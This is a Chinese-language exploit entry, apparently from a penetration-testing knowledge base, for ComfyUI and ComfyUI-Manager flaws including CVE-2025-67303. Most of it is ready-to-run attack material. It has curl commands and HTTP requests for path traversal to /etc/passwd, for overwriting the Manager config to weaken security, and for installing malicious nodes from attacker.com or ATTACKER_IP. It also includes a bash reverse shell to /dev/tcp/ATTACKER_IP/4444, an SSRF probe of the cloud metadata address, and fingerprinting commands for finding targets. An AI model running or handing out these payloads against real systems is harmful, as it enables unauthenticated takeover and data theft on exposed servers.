---
id: COMFYUI-PATH-TRAVERSAL-RCE
title: ComfyUI 路径穿越与远程代码执行漏洞
product: comfyui
vendor: comfyanonymous
version_affected: "< 0.3.7 / Manager < 3.38"
severity: CRITICAL
tags: [rce, path_traversal, ssrf, ai, stable_diffusion, config_injection, 无需认证]
fingerprint: ["ComfyUI", "comfyui", "/api/prompt", "/view?filename=", "/object_info", "ComfyUI-Manager"]
---

## 漏洞描述

ComfyUI 是流行的 Stable Diffusion 图像生成 WebUI。默认监听 0.0.0.0:8188 且无认证，存在路径穿越读取文件、通过自定义节点执行代码、SSRF 等漏洞。

## 影响版本

- ComfyUI < 0.3.7（路径穿越、未授权访问）
- ComfyUI-Manager < 3.38（CVE-2025-67303 配置注入绕过安全限制）
- ComfyUI 所有版本（默认无认证）

## 前置条件

- 目标 ComfyUI 服务端口（默认8188）可从网络访问
- 服务未配置认证（默认行为）
- RCE 通过恶意节点需攻击者控制一个 HTTP 服务器托管恶意节点包

## 利用步骤

### 未授权访问确认

```bash
curl http://target:8188/
curl http://target:8188/object_info
curl http://target:8188/system_stats
```

### 路径穿越任意文件读取

```http
GET /view?filename=../../../../../../etc/passwd&type=output&subfolder= HTTP/1.1
Host: target:8188
```

或通过 API:
```http
GET /api/view?filename=../../../etc/passwd&subfolder=&type=output HTTP/1.1
Host: target:8188
```

### 通过自定义工作流执行代码

提交包含恶意 Python 代码的工作流:
```http
POST /api/prompt HTTP/1.1
Content-Type: application/json

{
  "prompt": {
    "1": {
      "class_type": "LoadImage",
      "inputs": {"image": "../../../../../../etc/passwd"}
    }
  }
}
```

### 通过 ComfyUI-Manager 安装恶意节点 RCE

```http
POST /customnode/install HTTP/1.1
Content-Type: application/json

{"url": "http://attacker.com/malicious-node-pack"}
```

恶意节点包的 `__init__.py` 在加载时自动执行代码。

### CVE-2025-67303: ComfyUI-Manager 配置注入绕过安全限制 → RCE

**影响版本**: ComfyUI-Manager < v3.38

默认 `security_level=normal` 会阻止 `/customnode/install/git_url`。但配置存储在未受保护的 `user/default/` 目录下，攻击者可通过 ComfyUI 自带的 userdata API 直接改写配置。

**Step 1 — 读取当前配置**:
```http
GET /userdata/ComfyUI-Manager%2Fconfig.ini HTTP/1.1
Host: target:8188
```

**Step 2 — 覆写配置，将 security_level 改为 weak**:
```http
POST /userdata/ComfyUI-Manager%2Fconfig.ini HTTP/1.1
Host: target:8188
Content-Type: application/octet-stream

[default]
preview_method = none
git_exe =
use_uv = True
channel_url = https://raw.githubusercontent.com/ltdrdata/ComfyUI-Manager/main
share_option = all
bypass_ssl = False
file_logging = True
component_policy = workflow
update_policy = stable-comfyui
windows_selector_event_loop_policy = False
model_download_by_agent = False
downgrade_blacklist =
security_level = weak
always_lazy_install = False
network_mode = public
db_mode = cache
```

**Step 3 — 重启服务使配置生效**:
```http
GET /api/manager/reboot HTTP/1.1
Host: target:8188
```

**Step 4 — 安装恶意自定义节点（现在不再 403）**:
```http
POST /customnode/install/git_url HTTP/1.1
Host: target:8188
Content-Type: text/plain

http://ATTACKER_IP:9999/evil-node-abc123
```

恶意节点的 `install.py` 在安装过程中直接执行:
```python
import subprocess
subprocess.run(["bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"])
```

### SSRF (通过 Load Image from URL 节点)

如果安装了 URL 加载节点:
```json
{"class_type": "LoadImageFromURL", "inputs": {"url": "http://169.254.169.254/latest/meta-data/"}}
```

## Payload

### 路径穿越任意文件读取

```bash
curl -s "http://target:8188/view?filename=../../../../../../etc/passwd&type=output&subfolder="
```

### CVE-2025-67303: 配置注入 → 安装恶意节点 → RCE

```bash
# Step 1: 覆写配置，将 security_level 改为 weak
curl -s -X POST "http://target:8188/userdata/ComfyUI-Manager%2Fconfig.ini" \
  -H "Content-Type: application/octet-stream" \
  -d '[default]
preview_method = none
security_level = weak
network_mode = public'

# Step 2: 重启服务使配置生效
curl -s "http://target:8188/api/manager/reboot"

# Step 3: 安装恶意自定义节点（等待服务重启后执行）
sleep 10
curl -s -X POST "http://target:8188/customnode/install/git_url" \
  -H "Content-Type: text/plain" \
  -d 'http://ATTACKER_IP:9999/evil-node-pack'
```

### 通过 ComfyUI-Manager 安装恶意节点

```bash
curl -s -X POST http://target:8188/customnode/install \
  -H "Content-Type: application/json" \
  -d '{"url": "http://attacker.com/malicious-node-pack"}'
```

## 验证方法

```bash
# 1. 确认未授权访问
curl -s http://target:8188/system_stats | grep '"system"'

# 2. 路径穿越验证：返回文件内容即可利用
curl -s "http://target:8188/view?filename=../../../../../../etc/passwd&type=output&subfolder=" | grep "root:"

# 3. 配置注入验证：可读取 Manager 配置
curl -s "http://target:8188/userdata/ComfyUI-Manager%2Fconfig.ini" | grep "security_level"

# 4. RCE 验证：恶意节点安装后通过 OOB 回调确认
# 在 attacker.com 监听连接，安装恶意节点后检查是否收到反弹 Shell 或回调
```

## 指纹确认

```bash
curl -s http://target:8188/ | grep -i "comfyui"
curl -s http://target:8188/system_stats
curl -s http://target:8188/object_info | head -c 200
```
